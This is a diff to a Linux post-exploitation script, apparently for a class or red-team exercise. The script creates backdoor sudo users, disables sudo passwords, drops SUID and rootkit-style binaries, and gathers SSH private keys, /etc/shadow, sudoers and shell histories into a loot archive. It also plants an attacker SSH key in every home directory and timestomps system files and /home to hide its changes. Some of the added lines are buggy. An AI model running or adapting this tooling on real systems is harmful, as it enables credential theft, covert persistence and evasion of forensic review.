@@ -6,6 +6,7 @@
 # Its functions are as follows:
 #	- Attempt to open firewall (U/C)
 #	- Add sudo backup users
+#	- Collect useful and sensitive files for export
 #	- Ensure sudo doesnt need password
 #	- SUID bins
 #	- Drop prism bins
@@ -49,7 +50,8 @@ then
 	useradd -G wheel bmiller &>/dev/null
 	echo "bmiller:changeme" | chpasswd &>/dev/null
 	
-
+	## INSTALL STUFF ##
+	yum -y install nmap vim &>/dev/null
 	
 elif [[ -f /etc/debian_version ]]
 then
@@ -76,8 +78,48 @@ then
         echo "tgoodman:changeme" | chpasswd &>/dev/null
         useradd -G sudo bmiller &>/dev/null
         echo "bmiller:changeme" | chpasswd &>/dev/null
+
+	## INSTALL STUFF ##
+	apt -y install nmap vim &>/dev/null
+
+
 fi
 
+
+
+#===============================================================================
+				# COLLECT FOR EXPORT #
+#===============================================================================
+
+mkdir -p /tmp/l
+
+# GRAB SSH KEYS
+find / -name "*id_rsa*" 2> /dev/null > /tmp/t
+mkdir -p /tmp/jg
+for k in $(cat /tmp/t); do
+       cp $k /tmp/jg/$(echo "$k" | cut -d '/' -f3,5 | sed 's/\//-/g')
+done
+tar -cvf /tmp/l/keys.tar /tmp/jg
+mv /tmp/t /tmp/l/
+rm -rf /tmp/jg
+
+# COLLECT SENSITIVE CONFIGURATIONS
+cp /etc/passwd /tmp/l/p
+cp /etc/shadow /tmp/l/s
+cp /etc/group /tmp/l/g
+cp /etc/ssh/sshd_config /tmp/l/sh
+cp /etc/sudoers /tmp/l/su
+
+# COLLECT HISTORY
+mkdir -p /tmp/l/bh
+find /home -iname ".*history" 2>/dev/null > /tmp/b
+for hist in `cat /tmp/b`; do
+	cp $hist /tmp/bh/$(echo "st$k" | cut -d '/' -f3,5 | sed 's/\//-/g')
+done
+mv /tmp/b /tmp/l/
+
+tar -cvf /tmp/l.tar /tmp/l
+echo "[!] Don't forget to grab loot from /tmp/l.tar"
 
 #===============================================================================
 			# CONFIGURATIONSS #
@@ -91,8 +133,6 @@ fi
 
 mv /tmp/asdasd /etc/ssh/sshd_config
 rm -f /tmp/asdasd
-
-
 
 # Enable sudowoodo
 if grep -Fxq "ALL ALL=(ALL:ALL) NOPASSWD:ALL" /etc/sudoers
@@ -168,6 +208,14 @@ fi
 				# DROPPER #
 #===============================================================================
 
+# DROP SSH KEYS
+for d in /home/*; do
+	if [ -d "$d" ]; then
+		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDjx7//qwlI4IE4ZSrIvTT7D7ASiPeLIzl+0fVdBdbHVDSm+mIh7UQ9r5/d1XmUITWkFbk3KbrG7sJmeLjpd1vdsnr67qrs1dU4s4gHCN2rYeWt3dZxkUfLSjPCTx/Y2X1Itaa+Tdt33uEzuzxSnxCDlSKXAhP1+PedzVp/FsJKmbSaWsZeslLTssqBk4eiG0XIICG3dT0xDJyRmg1BXp1f9l7RvoDq3lAcPCOzg6bQc9U1sk+jinKaBwIEZWHazW+ZlQu4vw1ULTk7wQe87X5vVsPVbhBNaI4DZoWbzW3UizexHkn0RTQlydPEDbizVSUbnZ6hrOOSfBOqG4MM3pHBdIWu0gWnuo7d2CGFnlbMfaVQfhaZsKlU8KpIDZgOWD8gZoHI5xjh5bZEuPrsa2AGtwGoNWx4h9CedHfbb2J6O5YmxPrnL7baR7ofRiXnExvlo+xkS5BaQiAxEUZLjKRnGJZALdjDjLTY6Tt+/QH0+HJFaW6ePtdQIa9DAv7uGbU= moleary@classex.tu" >> /home/$d/.ssh/authorized_keys
+	fi
+done
+
+
 # PRISM
 chmod 7700 ./fsdisk
 cp ./fsdisk /sbin/
@@ -205,6 +253,9 @@ touch -m --date "2020-3-20 20:51:30" /etc/sudoers
 
 touch -a --date "2020-11-20 20:51:30" /etc/passwd
 touch -m --date "2020-11-20 20:51:30" /etc/passwd
+
+touch -a --date "2020-11-20 20:51:30" /etc/shadow
+touch -m --date "2020-11-20 20:51:30" /etc/shadow
 
 touch -a --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
 touch -m --date "2020-3-20 20:51:30" /etc/ssh/sshd_config
@@ -245,5 +296,9 @@ touch -m --date "2020-3-20 20:51:30" /etc/systemd/
 touch -a --date "2020-11-30 20:51:30" /etc
 touch -m --date "2020-11-30 20:51:30" /etc
 
+for target in `find /home`; do
+	touch -a --date "2020-1-27 13:06:01" $target
+	touch -m --date "2020-1-27 13:06:01" $target
+done
 
 exit 0
